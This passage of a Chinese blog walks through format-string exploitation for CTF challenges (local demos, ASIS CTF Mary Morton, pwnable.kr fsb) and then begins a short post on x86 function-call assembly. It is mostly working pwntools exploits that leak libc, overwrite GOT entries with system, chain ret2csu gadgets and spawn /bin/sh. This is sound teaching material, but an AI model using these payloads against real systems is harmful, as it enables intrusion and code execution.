class="string">"/bin/sh\x00"</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/02/22/格式化串漏洞利用总结/3.png" alt=""></p>
<h5 id="64位程序："><a href="#64位程序：" class="headerlink" title="64位程序："></a>64位程序：</h5><p>和32位程序的代码是一样的。编译时去掉了-m32选项。</p>
<p>64位参数的传递和32位有所不同，由于64位cpu寄存器很多，所以前6个参数通过寄存器传递，从函数名开始的第一个参数到第六个参数依次放在rdi,rsi,rdx,rcx,r8,r9，多余6个的参数，从右往左依次入栈。<br>由于64位程序的地址，很多高位是0，这样就会导致，格式化串被\x00截断,例如：<br><img src="/2019/02/22/格式化串漏洞利用总结/4.png" alt=""><br>拿read函数的got举例：<br><code>p64(read_got)=&quot;\x30\x10\x60\x00\x00\x00\x00\x00&quot;</code><br>由于字符串是以\x00结尾的，所以会被截断，但是将其放在字符串的末尾就可以解决了：<br><code>payload=&#39;A&#39;*(???) + &#39;%&#39; + str(offset+????) + &quot;$s&quot; + p64(read_got)</code><br>要注意将地址写在8字节对齐处。<br>payload前面的AAA..是为了将p64(read_got)写在8字节对齐处，至于要写多少个A，就按具体情况计算了。<br>完整的脚本如下：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line">a=process(<span class="string">"./demo64"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./demo64"</span>)</span><br><span class="line">libc=ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">offset=6</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">"read"</span>]</span><br><span class="line">payload=<span class="string">"AAAA%7$s"</span>+p64(read_got)<span class="comment">#本例中是4个A</span></span><br><span class="line">a.sendline(payload)</span><br><span class="line">read_addr=u64(a.recvuntil(<span class="string">"\x30"</span>,drop=True)[4:].ljust(8,'\x00'))</span><br><span class="line">print <span class="string">"read_addr = "</span>+str(hex(read_addr))</span><br><span class="line"></span><br><span class="line">system_addr=read_addr-libc.symbols[<span class="string">"read"</span>]+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">print <span class="string">"system_addr = "</span>+str(hex(system_addr))</span><br><span class="line">pop_rdi_ret=0x400753 <span class="comment">#ROPgadget</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ret2csu </span></span><br><span class="line">payload='A'*120 <span class="comment">#padding</span></span><br><span class="line">payload+=p64(0x40074A)<span class="comment">#csu_init </span></span><br><span class="line">payload+=p64(0)<span class="comment">#rbx=0</span></span><br><span class="line">payload+=p64(1)<span class="comment">#rbp=1</span></span><br><span class="line">payload+=p64(read_got)<span class="comment">#r12 </span></span><br><span class="line">payload+=p64(0)<span class="comment">#arg3 -&gt; fd</span></span><br><span class="line">payload+=p64(elf.bss())<span class="comment">#arg2 -&gt; buf</span></span><br><span class="line">payload+=p64(7)<span class="comment">#arg1 -&gt; length</span></span><br><span class="line">payload+=p64(0x400730)<span class="comment">#csu_init</span></span><br><span class="line">payload+='A'*56 <span class="comment">#padding</span></span><br><span class="line">payload+=p64(pop_rdi_ret)<span class="comment">#return address</span></span><br><span class="line">payload+=p64(elf.bss())</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line">a.sendline(payload)</span><br><span class="line">sleep(0.1)</span><br><span class="line">a.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/02/22/格式化串漏洞利用总结/5.png" alt=""></p>
<h3 id="修改内存："><a href="#修改内存：" class="headerlink" title="修改内存："></a>修改内存：</h3><p>   修改内存往往是修改函数的GOT表项，例如修改为system函数的地址，则调用被修改got表的函数就会调用system函数。结合下面的小例子来看一下：</p>
<pre><code>#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
int main()
{
  setbuf(stdout,0);
  while(1)
  {
    char b[100];
    gets(b);
    printf(b);
  }
  return 0;
}
</code></pre><p>   编译时关闭了canary保护和PIE保护。<br>   这个例子的利用思路就是先使用printf函数泄露某个函数的地址，然后结合libc库，计算出system函数的地址。第二次利用printf函数修改printf函数的got表项内容为system函数的地址，再输入字符串/bin/sh\x00，则再次调用printf函数时，其实会调用system(“/bin/sh”)，这样就可以拿到shell了。下面分32位程序和64位程序：</p>
<h5 id="32位程序：-1"><a href="#32位程序：-1" class="headerlink" title="32位程序："></a>32位程序：</h5><p>   32位程序不会有被地址截断的情况，则格式化串比较好写。<br>   可以用%hhn一个字节一个字节写，这样打印的字符就会很少，不至于程序崩溃，当然也可以用%hn两个字节两个字节写入。<br>   一个字节写入的模板如下：<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=p<span class="number">32</span><span class="comment">(target)</span>+p<span class="number">32</span><span class="comment">(target+1)</span>+p<span class="number">32</span><span class="comment">(target+2)</span>+p<span class="number">32</span><span class="comment">(target+3)</span></span><br><span class="line">payload+=<span class="string">'%'</span>+str<span class="comment">(length1)</span>+<span class="string">'c'</span>+<span class="string">"%"</span>+str<span class="comment">(offset)</span>+<span class="string">"$hhn"</span></span><br><span class="line">payload+=<span class="string">'%'</span>+str<span class="comment">(length2)</span>+<span class="string">'c'</span>+<span class="string">"%"</span>+str<span class="comment">(offset+1)</span>+<span class="string">"$hhn"</span></span><br><span class="line">payload+=<span class="string">'%'</span>+str<span class="comment">(length3)</span>+<span class="string">'c'</span>+<span class="string">"%"</span>+str<span class="comment">(offset+2)</span>+<span class="string">"$hhn"</span></span><br><span class="line">payload+=<span class="string">'%'</span>+str<span class="comment">(length4)</span>+<span class="string">'c'</span>+<span class="string">"%"</span>+str<span class="comment">(offset+3)</span>+<span class="string">"$hhn"</span></span><br></pre></td></tr></table></figure></p>
<p>pwntools这个库有了现成的函数fmtstr_payload，可以生成修改内存的格式化串,但是这个只适用于32位的，原因是这个函数生成的payload和上面写的模板是一样的，64位的程序，地址会有00，这个payload会被截断。<br>   完整的利用脚本如下：</p>
<pre><code>#!/usr/bin/env python
from pwn import *
context.log_level=&quot;debug&quot;
a=process(&quot;./fsb&quot;)
elf=ELF(&quot;./fsb&quot;)
libc=ELF(&quot;./libc.so.6&quot;)
printf_got=elf.got[&quot;printf&quot;]
def leak(addr):
    payload=p32(addr)
    payload+=&quot;%7$s&quot;
    a.sendline(payload)
    data=a.recv(8)[4:8]
    return data

def get(target,printed):
    if printed&gt;target:
        return (256-printed+target)
    elif printed==target:
        return 0
    else: 
        return target-printed

def modify(target,offset,old):
    t1=target&amp;0xff
    t2=target&gt;&gt;8&amp;0xff
    t3=target&gt;&gt;16&amp;0xff
    t4=target&gt;&gt;24&amp;0xff

    payload=p32(old)+p32(old+1)+p32(old+2)+p32(old+3)
    len1=get(t1,len(payload))
    len2=get(t2,(len1)+16)
    len3=get(t3,(len2+len1)+16)
    len4=get(t4,(len3+len2+len1)+16)
    payload+=&apos;%&apos;+str(len1)+&apos;c&apos;+&apos;%&apos;+str(offset)+&apos;$hhn&apos;
    payload+=&apos;%&apos;+str(len2)+&apos;c&apos;+&apos;%&apos;+str(offset+1)+&apos;$hhn&apos;
    payload+=&apos;%&apos;+str(len3)+&apos;c&apos;+&apos;%&apos;+str(offset+2)+&apos;$hhn&apos;
    payload+=&apos;%&apos;+str(len4)+&apos;c&apos;+&apos;%&apos;+str(offset+3)+&apos;$hhn&apos;
    return payload

printf_addr=u32(leak(printf_got))

system_addr=printf_addr-libc.symbols[&quot;printf&quot;]+libc.symbols[&quot;system&quot;]

payload=modify(system_addr,7,printf_got)

a.sendline(payload) 
sleep(0.1)
a.sendline(&quot;/bin/sh\x00&quot;)
a.interactive()
</code></pre><p>解释下脚本：</p>
<pre><code>payload=p32(old)+p32(old+1)+p32(old+2)+p32(old+3)
</code></pre><p>这里是先将要修改的got表项的地址写入栈中，然后利用找到的偏移来一个字节一个字节的修改</p>
<pre><code>def get(target,printed):
        if printed&gt;target:
            return (0x100-printed+target)
        elif printed==target:
            return 0
        else: 
            return target-printed
</code></pre><p>get函数是用来计算要打印多少字节的。如果前面覆盖字节所需打印的字符的个数超过了后面要打印字符的个数，则可以通过溢出来调整，例如你想要写入\x00，则你可以打印0x100个字符，因为只能写入一个字节长度，所以高位字节会被截断，只留下\x00。</p>
<h5 id="64位程序：-1"><a href="#64位程序：-1" class="headerlink" title="64位程序："></a>64位程序：</h5><p>64位程序用这道题做示范：ASIS CTF 2017 Mary Morton</p>
<p>网上的writeup都是使用现成的工具formatStringExploiter来攻击的。<br>还有的writeup是通过泄露canary，利用栈溢出写rop利用的。这次通过手动利用格式化串漏洞来攻击。<br>64位程序，修改内存，就不能像上面32位那样分开一点一点写了，只能利用%lln一次写完。当然，如果目标内存，只需要修改2个字节或者4字节，就可以使用%hn，%n。<br>格式化串的模板如下：<br><code>payload=&#39;a&#39;*(???)+&#39;%&#39;+str(length)+&#39;c&#39;+&#39;%&#39;+str(offset+????)+&quot;$lln&quot;+p64(目标地址)</code><br>payload前面的 ‘a’ 是考虑到字节对齐的问题，要将目标地址写在8字节对齐处。offset要加多少，也是根据具体情况。<br>题目的main函数如下：<br><img src="/2019/02/22/格式化串漏洞利用总结/6.png" alt=""><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">fsb</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);<span class="meta">#canary</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x7F</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf, &amp;buf);#格式化串漏洞</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">stackoverflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);<span class="meta">#canary</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);#栈溢出</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"-&gt; %s\n"</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>程序中给了后门函数,但是没有shell。<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> sub_4008DA()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">return</span> <span class="title">system</span><span class="params">(<span class="string">"/bin/cat ./flag"</span>)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我写这道题的思路有两个：可以利用格式化串漏洞修改printf函数的got表，将其修改为system函数的plt，再次执行fsb函数时，输入/bin/sh，则可以拿到shell。<br>也可以修改_stack_chk_fail 的got表，将其修改为这个后门函数的地址，当执行Stackoverflow函数时，破坏掉canary，则会执行后门函数。<br>exp采用的是思路1：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">from</span> pwn import *</span><br><span class="line">context.arch=<span class="string">"amd64"</span></span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line"><span class="comment">#a=remote("111.198.29.45","31730")</span></span><br><span class="line"><span class="keyword">a</span>=<span class="built_in">process</span>(<span class="string">"./mary_morton"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./mary_morton"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">a</span>.recvuntil(<span class="string">"3. Exit the battle \n"</span>)</span><br><span class="line"><span class="keyword">a</span>.sendline(<span class="string">"2"</span>)</span><br><span class="line">printf_got=elf.got[<span class="string">"printf"</span>]</span><br><span class="line">system_plt=elf.plt[<span class="string">"system"</span>]</span><br><span class="line">length2=<span class="built_in">len</span>(str(system_plt))</span><br><span class="line">payload=<span class="string">'a'</span>*(<span class="number">8</span>-length2)+<span class="string">'%'</span>+str(system_plt<span class="number">-8</span>+length2)+<span class="string">'c'</span>+<span class="string">"%8$lln"</span>+p64(printf_got)</span><br><span class="line">print payload</span><br><span class="line"><span class="keyword">a</span>.<span class="built_in">send</span>(payload)</span><br><span class="line"><span class="keyword">a</span>.recv()</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">a</span>.sendline(<span class="string">"2"</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">a</span>.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"><span class="keyword">a</span>.interactive()</span><br></pre></td></tr></table></figure></p>
<h3 id="格式化串不在栈中："><a href="#格式化串不在栈中：" class="headerlink" title="格式化串不在栈中："></a>格式化串不在栈中：</h3><p>某些时候你输入的格式化串不是保存在栈中的，这些字符串可能保存在bss段或者堆中，那么你使用多少%p，都不能找到你写入的格式化串。例如：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line">	<span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">std</span>::<span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">   <span class="built_in">printf</span>(a);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里的字符串a，就是全局变量，保存在bss段。<br><img src="/2019/02/22/格式化串漏洞利用总结/7.png" alt=""><br>不管你用多少%p，都找不到这个格式化串。<br>这样就需要找个跳板——栈中保存的EBP/RBP。</p>
<h4 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h4><p>当函数初始化完成后(对汇编函数调用过程不了解请看原先笔记)，在当前函数栈帧中，EBP指向上一个函数栈帧的EBP，即saved EBP。如图所示：<br><img src="/2019/02/22/格式化串漏洞利用总结/8.png" alt=""><br>那么就可以将saved ebp指向的内存修改为你想要修改的内存单元的地址。即第一次利用格式化串漏洞，将想要修改的内存单元的指针写入栈中。<br>例如，你想修改某个函数的got表项，第一次修改后如图所示：<br><img src="/2019/02/22/格式化串漏洞利用总结/9.png" alt=""><br>因为saved ebp 本来就保存在栈中，且当前EBP和printf的参数——格式化串的距离是固定不变的，所以可以直接使用 <code>%number$n</code>找到saved ebp，将saved ebp指向的内存单元修改掉。<br>又因为上一个函数的EBP，即当前函数的栈帧中保存的saved ebp，和printf的参数也是固定不变的，所以第二次利用格式化串找到第一次修改的地址，即可修改目标，如图所示：<br><img src="/2019/02/22/格式化串漏洞利用总结/10.png" alt=""><br>图中的4和9，都是随便写的，具体数值需要根据题目调试出来。</p>
<p>利用模板如下：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一次漏洞利用：</span><br><span class="line">payload='%'+str(想要修改的内存单元的地址)+‘c’+‘%offset1$n’</span><br><span class="line">offset1= 格式化串和EBP的偏移</span><br><span class="line"><span class="section">第二次漏洞利用:</span></span><br><span class="line">payload='%'+str(想要修改的数值)+‘c’+<span class="string">"%offset2$n"</span></span><br><span class="line">offset2= 格式化串和saved ebp的偏移</span><br></pre></td></tr></table></figure></p>
<p>其中第一次漏洞利用是将地址写入栈中，第二次才是真正的修改。</p>
<h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p>pwnable.kr 中的fsb，就是格式化串不在栈中的。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;alloca.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> key;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span> buf2[<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsb</span><span class="params">(<span class="keyword">char</span>** argv, <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span>* args[]=&#123;<span class="string">"/bin/sh"</span>, <span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">char</span>*** pargv = &amp;argv;</span><br><span class="line">	<span class="keyword">char</span>*** penvp = &amp;envp;</span><br><span class="line">        <span class="keyword">char</span>** arg;</span><br><span class="line">        <span class="keyword">char</span>* c;</span><br><span class="line">        <span class="keyword">for</span>(arg=argv;*arg;arg++) <span class="keyword">for</span>(c=*arg; *c;c++) *c=<span class="string">'\0'</span>;</span><br><span class="line">        <span class="keyword">for</span>(arg=envp;*arg;arg++) <span class="keyword">for</span>(c=*arg; *c;c++) *c=<span class="string">'\0'</span>;</span><br><span class="line">	*pargv=<span class="number">0</span>;</span><br><span class="line">	*penvp=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Give me some format strings(%d)\n"</span>, i+<span class="number">1</span>);</span><br><span class="line">		read(<span class="number">0</span>, buf, <span class="number">100</span>);</span><br><span class="line">		<span class="built_in">printf</span>(buf); <span class="comment">//漏洞在这里</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Wait a sec...\n"</span>);</span><br><span class="line">        sleep(<span class="number">3</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"key : \n"</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf2, <span class="number">100</span>);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> pw = strtoull(buf2, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span>(pw == key)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Congratz!\n"</span>);</span><br><span class="line">                execve(args[<span class="number">0</span>], args, <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Incorrect key \n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>, O_RDONLY);</span><br><span class="line">	<span class="keyword">if</span>( fd==<span class="number">-1</span> || read(fd, &amp;key, <span class="number">8</span>) != <span class="number">8</span> )&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Error, tell admin\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	close(fd);</span><br><span class="line">	alloca(<span class="number">0x12345</span> &amp; key);<span class="comment">//在栈中申请空间，申请的大小是随机化的</span></span><br><span class="line">	fsb(argv, envp); <span class="comment">// exploit this format string bug!</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>利用思路就是将sleep函数的got表项修改为execve(“/bin/sh”,0,0)的地址。<br>百度了一下alloca这个函数，是在栈中申请空间，类似于malloc，由于这个申请的栈空间的大小是不一定的，也就是说fsb这个函数栈帧的基地址EBP和ESP都是不确定的，则需要通过泄露栈中数据计算出offset。<br>在printf处下个断点。<br><img src="/2019/02/22/格式化串漏洞利用总结/12.png" alt=""><br>此时esp指向的是格式化字符串。<br>通过泄露图中0xfffeccf8所指向的内容再减去80，即可算出ESP，再泄露出saved ebp，两者相减再除以4，即可算出offset。<br>对应的payload的如下：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">"%14$08x%18$08x"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">esp=int(p.recv(8),16)-0x50</span><br><span class="line">ebp=int(p.recv(8),16)</span><br><span class="line">offset=(ebp-esp)/4</span><br></pre></td></tr></table></figure></p>
<p>完整的exp如下：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line">p=ssh(host='pwnable.kr',port=2222,user='fsb',password='guest').run('/home/fsb/fsb')</span><br><span class="line">sleep_got=0x0804a008</span><br><span class="line">system=0x080486ab</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"(1)\n"</span>) <span class="comment">#第一次利用，计算offset</span></span><br><span class="line">payload=<span class="string">"%14$08x%18$08x"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">esp=int(p.recv(8),16)-0x50</span><br><span class="line">ebp=int(p.recv(8),16)</span><br><span class="line">offset=(ebp-esp)/4</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"(2)\n"</span>)</span><br><span class="line">payload=<span class="string">"%134520840c"</span>+<span class="string">"%18$n"</span> <span class="comment">#修改saved ebp所指向的内容为sleep表项地址</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"(3)\n"</span>)</span><br><span class="line">payload=<span class="string">"AAA%134514344c"</span>+<span class="string">"%"</span>+str(offset)+<span class="string">"$n"</span> <span class="comment">#修改为getshell的地址</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"(4)\n"</span>)</span><br><span class="line">payload=<span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/11/x86汇编-函数调用/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ditto">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/my.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ditto's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/02/11/x86汇编-函数调用/" itemprop="url">x86汇编 函数调用</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-11T17:05:59+08:00">
                2019-02-11
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  527
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>函数调用一般有个模板。</p>
<pre><code>push ebp
mov ebp,esp
//这里提升堆栈
sub esp,0x40  
//这里是开辟缓冲区，不同编译器开辟的缓冲区大小不同。
push edi
push esi
push ebx
//保留现场
lea edi, dword ptr ss:[ebp-0x40]
mov ecx,0x10
mov eax,0xcccccccc
rep stos dowrd ptr es:[edi]
//填充缓冲区
----------------
这里是写函数的功能
----------------
    pop ebx
    pop esi
    pop edi
    //恢复现场
    mov esp,ebp
    pop ebp
    ret
